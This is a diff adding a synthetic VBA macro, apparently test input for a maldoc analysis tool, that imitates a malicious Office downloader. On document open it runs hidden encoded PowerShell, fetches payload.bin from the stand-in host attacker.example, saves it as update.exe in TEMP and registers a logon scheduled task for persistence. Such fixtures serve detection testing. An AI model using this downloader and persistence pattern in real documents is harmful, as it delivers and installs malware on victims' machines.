@@ -1,0 +1,28 @@
+' Synthetic VBA macro mirroring patterns seen in real downloader docs.
+' This is plain text — feed it to maldoc with --from-text --type office.
+
+Sub AutoOpen()
+    Dim shell As Object
+    Set shell = CreateObject("WScript.Shell")
+    Dim cmd As String
+    cmd = "powershell.exe -nop -w hidden -enc " & _
+          Chr(80) & Chr(86) & Chr(82) & Chr(83) & Chr(70) & Chr(68)
+    shell.Run cmd, 0, False
+
+    Dim http As Object
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.Open "GET", "http://attacker.example/payload.bin", False
+    http.Send
+
+    Dim stream As Object
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Open
+    stream.Type = 1
+    stream.Write http.responseBody
+    stream.SaveToFile Environ("TEMP") & "\update.exe", 2
+
+    shell.Run "schtasks /Create /SC ONLOGON /TN UpdaterTask /TR """ & _
+              Environ("TEMP") & "\update.exe""", 0, True
+
+    Sleep 30000
+End Sub
